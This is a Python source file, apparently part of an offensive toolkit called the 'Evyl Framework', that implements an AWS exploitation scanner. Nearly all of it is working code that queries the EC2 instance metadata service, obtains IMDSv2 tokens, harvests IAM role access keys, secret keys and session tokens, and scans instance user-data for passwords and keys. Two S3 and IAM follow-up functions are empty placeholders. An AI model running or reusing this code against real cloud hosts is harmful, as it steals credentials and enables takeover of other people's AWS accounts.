"""
AWS Scanner for Evyl Framework

Comprehensive AWS exploitation including metadata service, IAM, and service enumeration.
"""

import asyncio
import aiohttp
import json
import base64
from typing import Dict, List, Any, Optional
from urllib.parse import urljoin

from utils.logger import Logger
from utils.network import NetworkManager

class AWSScanner:
    """AWS exploitation and enumeration scanner"""
    
    def __init__(self):
        self.logger = Logger()
        self.network_manager = NetworkManager()
        
        # AWS metadata endpoints
        self.metadata_base = "http://169.254.169.254"
        self.metadata_endpoints = [
            "/latest/meta-data/",
            "/latest/meta-data/iam/security-credentials/",
            "/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
            "/latest/meta-data/instance-id",
            "/latest/meta-data/hostname", 
            "/latest/meta-data/local-hostname",
            "/latest/meta-data/public-hostname",
            "/latest/meta-data/public-ipv4",
            "/latest/meta-data/local-ipv4",
            "/latest/meta-data/mac",
            "/latest/meta-data/network/interfaces/macs/",
            "/latest/meta-data/placement/availability-zone",
            "/latest/meta-data/placement/region",
            "/latest/user-data",
            "/latest/dynamic/instance-identity/document",
            "/latest/dynamic/instance-identity/signature",
            "/latest/api/token"
        ]
        
        # IMDSv2 token endpoint
        self.token_endpoint = "/latest/api/token"
        
    async def scan(self, target: str) -> Dict[str, Any]:
        """Main AWS scan function"""
        results = {
            'target': target,
            'vulnerabilities': [],
            'credentials': [],
            'metadata_access': False,
            'imdsv1_enabled': False,
            'imdsv2_enabled': False,
            'iam_credentials': [],
            'user_data': None,
            'instance_info': {}
        }
        
        # Check metadata service access
        await self._check_metadata_access(results)
        
        # Try to get IMDSv2 token
        token = await self._get_imdsv2_token()
        if token:
            results['imdsv2_enabled'] = True
            self.logger.info("IMDSv2 token obtained")
        
        # Enumerate metadata endpoints
        await self._enumerate_metadata(token, results)
        
        # Extract IAM credentials
        await self._extract_iam_credentials(token, results)
        
        # Extract user data
        await self._extract_user_data(token, results)
        
        # Get instance identity
        await self._get_instance_identity(token, results)
        
        return results
    
    async def _check_metadata_access(self, results: Dict[str, Any]):
        """Check basic metadata service access"""
        try:
            url = f"{self.metadata_base}/latest/meta-data/"
            headers = self.network_manager.get_headers()
            
            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as response:
                    if response.status == 200:
                        results['metadata_access'] = True
                        results['imdsv1_enabled'] = True
                        
                        results['vulnerabilities'].append({
                            'type': 'aws_metadata_access',
                            'severity': 'high',
                            'url': url,
                            'description': 'AWS metadata service accessible via IMDSv1'
                        })
                        
                        self.logger.vulnerability_found('aws_metadata_exposure', url, 'high')
                        
        except Exception as e:
            self.logger.debug(f"Error checking metadata access: {e}")
    
    async def _get_imdsv2_token(self) -> Optional[str]:
        """Get IMDSv2 token"""
        try:
            url = f"{self.metadata_base}{self.token_endpoint}"
            headers = {
                'X-aws-ec2-metadata-token-ttl-seconds': '21600',
                **self.network_manager.get_headers()
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.put(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as response:
                    if response.status == 200:
                        token = await response.text()
                        return token.strip()
                        
        except Exception as e:
            self.logger.debug(f"Error getting IMDSv2 token: {e}")
        
        return None
    
    async def _enumerate_metadata(self, token: Optional[str], results: Dict[str, Any]):
        """Enumerate all metadata endpoints"""
        for endpoint in self.metadata_endpoints:
            try:
                url = f"{self.metadata_base}{endpoint}"
                headers = self.network_manager.get_headers()
                
                # Add IMDSv2 token if available
                if token:
                    headers['X-aws-ec2-metadata-token'] = token
                
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as response:
                        if response.status == 200:
                            content = await response.text()
                            
                            # Store endpoint data
                            endpoint_name = endpoint.replace('/latest/meta-data/', '').replace('/', '_')
                            if endpoint_name:
                                results['instance_info'][endpoint_name] = content
                            
                            self.logger.debug(f"Metadata endpoint accessible: {endpoint}")
                            
            except Exception as e:
                self.logger.debug(f"Error accessing {endpoint}: {e}")
    
    async def _extract_iam_credentials(self, token: Optional[str], results: Dict[str, Any]):
        """Extract IAM credentials from metadata service"""
        try:
            # First, get list of roles
            roles_url = f"{self.metadata_base}/latest/meta-data/iam/security-credentials/"
            headers = self.network_manager.get_headers()
            
            if token:
                headers['X-aws-ec2-metadata-token'] = token
            
            async with aiohttp.ClientSession() as session:
                async with session.get(roles_url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as response:
                    if response.status == 200:
                        roles_text = await response.text()
                        roles = [role.strip() for role in roles_text.split('\n') if role.strip()]
                        
                        # Get credentials for each role
                        for role in roles:
                            await self._get_role_credentials(role, token, results)
                            
        except Exception as e:
            self.logger.debug(f"Error extracting IAM credentials: {e}")
    
    async def _get_role_credentials(self, role: str, token: Optional[str], results: Dict[str, Any]):
        """Get credentials for a specific IAM role"""
        try:
            creds_url = f"{self.metadata_base}/latest/meta-data/iam/security-credentials/{role}"
            headers = self.network_manager.get_headers()
            
            if token:
                headers['X-aws-ec2-metadata-token'] = token
            
            async with aiohttp.ClientSession() as session:
                async with session.get(creds_url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as response:
                    if response.status == 200:
                        creds_text = await response.text()
                        
                        try:
                            creds_data = json.loads(creds_text)
                            
                            credentials = {
                                'type': 'aws_iam_credentials',
                                'role': role,
                                'access_key_id': creds_data.get('AccessKeyId'),
                                'secret_access_key': creds_data.get('SecretAccessKey'),
                                'session_token': creds_data.get('Token'),
                                'expiration': creds_data.get('Expiration'),
                                'url': creds_url
                            }
                            
                            results['iam_credentials'].append(credentials)
                            results['credentials'].append(credentials)
                            
                            self.logger.credential_found('aws_iam_credentials', creds_url)
                            
                            results['vulnerabilities'].append({
                                'type': 'aws_iam_credentials_exposed',
                                'severity': 'critical',
                                'url': creds_url,
                                'role': role,
                                'description': f'AWS IAM credentials exposed for role: {role}'
                            })
                            
                        except json.JSONDecodeError:
                            self.logger.debug(f"Invalid JSON in IAM credentials for role {role}")
                            
        except Exception as e:
            self.logger.debug(f"Error getting credentials for role {role}: {e}")
    
    async def _extract_user_data(self, token: Optional[str], results: Dict[str, Any]):
        """Extract user data which may contain sensitive information"""
        try:
            user_data_url = f"{self.metadata_base}/latest/user-data"
            headers = self.network_manager.get_headers()
            
            if token:
                headers['X-aws-ec2-metadata-token'] = token
            
            async with aiohttp.ClientSession() as session:
                async with session.get(user_data_url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as response:
                    if response.status == 200:
                        user_data = await response.text()
                        
                        if user_data and user_data.strip():
                            results['user_data'] = user_data
                            
                            # Check for sensitive data in user data
                            if self._contains_sensitive_data(user_data):
                                results['vulnerabilities'].append({
                                    'type': 'sensitive_user_data',
                                    'severity': 'high',
                                    'url': user_data_url,
                                    'description': 'User data contains potentially sensitive information'
                                })
                                
                                # Extract credentials from user data
                                await self._extract_credentials_from_user_data(user_data, user_data_url, results)
                            
                            self.logger.debug("User data extracted from metadata service")
                            
        except Exception as e:
            self.logger.debug(f"Error extracting user data: {e}")
    
    def _contains_sensitive_data(self, data: str) -> bool:
        """Check if data contains sensitive information"""
        sensitive_keywords = [
            'password', 'secret', 'key', 'token', 'credential',
            'aws_access_key', 'aws_secret', 'database_url',
            'api_key', 'private_key', 'ssh_key'
        ]
        
        data_lower = data.lower()
        return any(keyword in data_lower for keyword in sensitive_keywords)
    
    async def _extract_credentials_from_user_data(self, user_data: str, url: str, results: Dict[str, Any]):
        """Extract credentials from user data using regex patterns"""
        from patterns.regex_db import find_credentials
        
        found_creds = find_credentials(user_data)
        
        for cred in found_creds:
            cred['url'] = url
            cred['source'] = 'aws_user_data'
            results['credentials'].append(cred)
            
            self.logger.credential_found(cred['type'], url)
    
    async def _get_instance_identity(self, token: Optional[str], results: Dict[str, Any]):
        """Get instance identity document"""
        try:
            identity_url = f"{self.metadata_base}/latest/dynamic/instance-identity/document"
            headers = self.network_manager.get_headers()
            
            if token:
                headers['X-aws-ec2-metadata-token'] = token
            
            async with aiohttp.ClientSession() as session:
                async with session.get(identity_url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as response:
                    if response.status == 200:
                        identity_text = await response.text()
                        
                        try:
                            identity_data = json.loads(identity_text)
                            results['instance_info']['identity'] = identity_data
                            
                            self.logger.debug("Instance identity document obtained")
                            
                        except json.JSONDecodeError:
                            self.logger.debug("Invalid JSON in instance identity document")
                            
        except Exception as e:
            self.logger.debug(f"Error getting instance identity: {e}")
    
    async def enumerate_s3_buckets(self, access_key: str, secret_key: str, session_token: str = None) -> List[str]:
        """Enumerate S3 buckets using credentials"""
        # This would require boto3 implementation
        # For now, return empty list as placeholder
        return []
    
    async def test_iam_permissions(self, access_key: str, secret_key: str, session_token: str = None) -> Dict[str, Any]:
        """Test IAM permissions with discovered credentials"""
        # This would require boto3 implementation
        # For now, return empty dict as placeholder
        return {}